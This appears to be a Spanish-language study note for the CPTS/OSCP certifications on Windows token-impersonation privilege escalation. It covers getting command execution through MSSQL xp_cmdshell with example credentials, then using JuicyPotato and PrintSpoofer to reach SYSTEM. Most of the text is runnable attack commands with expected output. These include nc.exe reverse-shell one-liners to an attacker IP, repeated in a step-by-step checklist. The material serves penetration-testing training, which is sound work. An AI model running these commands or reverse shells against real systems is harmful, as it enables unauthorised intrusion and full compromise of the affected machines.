
## 1. Enumeración de privilegios

Los privilegios `SeImpersonatePrivilege` y `SeAssignPrimaryTokenPrivilege` pueden permitir escalar privilegios hasta `NT AUTHORITY\SYSTEM` mediante técnicas de suplantación de tokens.

Son especialmente interesantes cuando obtenemos ejecución de comandos a través de:

- IIS / ASP.NET.
    
- MSSQL (`xp_cmdshell`).
    
- Jenkins.
    
- Aplicaciones ejecutadas mediante cuentas de servicio.
    

### Comprobar privilegios

```
whoami /priv
```

**Buscar:**

```
SeImpersonatePrivilege           Enabled
SeAssignPrimaryTokenPrivilege    Disabled
```

> Aunque `SeAssignPrimaryTokenPrivilege` aparezca como `Disabled`, sigue siendo interesante comprobarlo. Su aprovechamiento depende de la herramienta y del contexto del proceso.

---

## 2. Obtener ejecución de comandos mediante MSSQL

### Conectarse con Impacket

```
mssqlclient.py sql_dev@10.129.43.30 -windows-auth
```

Credenciales del ejemplo:

```
Usuario: sql_dev
Contraseña: Str0ng_P@ssw0rd!
```

### Habilitar xp_cmdshell

Desde la consola de Impacket:

```
enable_xp_cmdshell
```

Esto permite ejecutar comandos del sistema operativo desde MSSQL, siempre que tengamos los permisos necesarios.

### Comprobar usuario actual

```
xp_cmdshell whoami
```

**Resultado:**

```
nt service\mssql$sqlexpress01
```

### Enumerar privilegios

```
xp_cmdshell whoami /priv
```

**Resultado interesante:**

```
SeAssignPrimaryTokenPrivilege    Disabled
SeImpersonatePrivilege           Enabled
```

La cuenta de servicio dispone de `SeImpersonatePrivilege`, por lo que podemos comprobar si es vulnerable a técnicas de escalada de tipo Potato.

## 3. Escalada con JuicyPotato

**Requisitos:**

- `SeImpersonatePrivilege` o `SeAssignPrimaryTokenPrivilege`.
    
- Una versión de Windows compatible.
    
- `JuicyPotato.exe` y `nc.exe` en el objetivo.
    
- Conectividad hacia nuestra máquina atacante.
    

JuicyPotato aprovecha mecanismos de autenticación COM/DCOM para obtener un token privilegiado y crear un proceso con él.

### Preparar listener

En Kali:

```
nc -lvnp 8443
```

### Ejecutar JuicyPotato

Desde MSSQL:

```
xp_cmdshell c:\tools\JuicyPotato.exe -l 53375 -p c:\windows\system32\cmd.exe -a "/c c:\tools\nc.exe 10.10.14.3 8443 -e cmd.exe" -t *
```

**Parámetros:**

|Parámetro|Función|
|---|---|
|`-l 53375`|Puerto local utilizado por el servidor COM.|
|`-p`|Programa que se ejecutará.|
|`-a`|Argumentos del programa.|
|`-t *`|Prueba ambos métodos de creación de procesos.|

Con `-t *`, JuicyPotato prueba:

- `CreateProcessWithTokenW`: asociado a `SeImpersonatePrivilege`.
    
- `CreateProcessAsUser`: asociado a `SeAssignPrimaryTokenPrivilege`.
    

### Resultado esperado

```
[+] authresult 0
NT AUTHORITY\SYSTEM
[+] CreateProcessWithTokenW OK
```

En el listener:

```
whoami
```

```
nt authority\system
```

### Compatibilidad

**JuicyPotato clásico no funciona en Windows Server 2019 ni en Windows 10 a partir de la versión 1809**, debido a cambios en los mecanismos que utiliza.

En esos sistemas podemos comprobar alternativas como PrintSpoofer o RoguePotato.

## 4. Escalada con PrintSpoofer

PrintSpoofer permite aprovechar `SeImpersonatePrivilege` mediante técnicas relacionadas con Named Pipes.

Es una alternativa para versiones de Windows donde JuicyPotato clásico ya no funciona.

### Requisitos

- `SeImpersonatePrivilege`.
    
- `PrintSpoofer.exe` en el objetivo.
    
- Un sistema compatible con la técnica.
    
- `nc.exe` si queremos recibir una reverse shell.
    

### Preparar listener

```
nc -lvnp 8443
```

### Ejecutar PrintSpoofer

Desde MSSQL:

```
xp_cmdshell c:\tools\PrintSpoofer.exe -c "c:\tools\nc.exe 10.10.14.3 8443 -e cmd"
```

**Parámetro:**

- `-c`: comando que queremos ejecutar con los privilegios obtenidos.
    

### Resultado esperado

```
[+] Found privilege: SeImpersonatePrivilege
[+] Named pipe listening...
[+] CreateProcessAsUser() OK
```

Comprobar la shell recibida:

```
whoami
```

```
nt authority\system
```

---

## 5. JuicyPotato vs. PrintSpoofer

|Característica|JuicyPotato|PrintSpoofer|
|---|---|---|
|Privilegio principal|`SeImpersonate` / `SeAssignPrimaryToken`|`SeImpersonate`|
|Técnica|COM/DCOM|Named Pipes|
|Windows Server 2016|Compatible en configuraciones vulnerables|Puede funcionar|
|Windows Server 2019|JuicyPotato clásico no funciona|Alternativa|
|Windows 10 1809+|JuicyPotato clásico no funciona|Alternativa|
|Objetivo|SYSTEM|SYSTEM|

La compatibilidad real depende también de los parches y de la configuración del sistema.

## 6. Checklist para CPTS/OSCP

### Paso 1 — Identificar el usuario

```
whoami
```

### Paso 2 — Enumerar privilegios

```
whoami /priv
```

**Buscar especialmente:**

```
SeImpersonatePrivilege
SeAssignPrimaryTokenPrivilege
```

### Paso 3 — Identificar versión de Windows

```
systeminfo
```

### Paso 4 — Seleccionar herramienta

- **Windows Server 2016:** comprobar JuicyPotato.
    
- **Windows Server 2019 / Windows 10 1809+:** comprobar PrintSpoofer o RoguePotato.
    

### Paso 5 — Ejecutar la técnica

**JuicyPotato:**

```
JuicyPotato.exe -l 53375 -p C:\Windows\System32\cmd.exe -a "/c C:\tools\nc.exe 10.10.14.3 8443 -e cmd.exe" -t *
```

**PrintSpoofer:**

```
PrintSpoofer.exe -c "C:\tools\nc.exe 10.10.14.3 8443 -e cmd"
```

### Paso 6 — Confirmar escalada

```
whoami
```

**Objetivo:**

```
nt authority\system
```

---

## 7. Puntos importantes para el examen

1. Después de obtener RCE como una cuenta de servicio, ejecutar siempre `whoami /priv`.
    
2. Si encontramos `SeImpersonatePrivilege`, comprobar inmediatamente posibles técnicas de suplantación de tokens.
    
3. Revisar la versión de Windows antes de seleccionar una herramienta.
    
4. JuicyPotato clásico es útil en versiones antiguas compatibles.
    
5. PrintSpoofer y RoguePotato son alternativas para versiones más recientes.
    
6. Tener `SeImpersonatePrivilege` no garantiza automáticamente la escalada: deben cumplirse las condiciones de explotación.
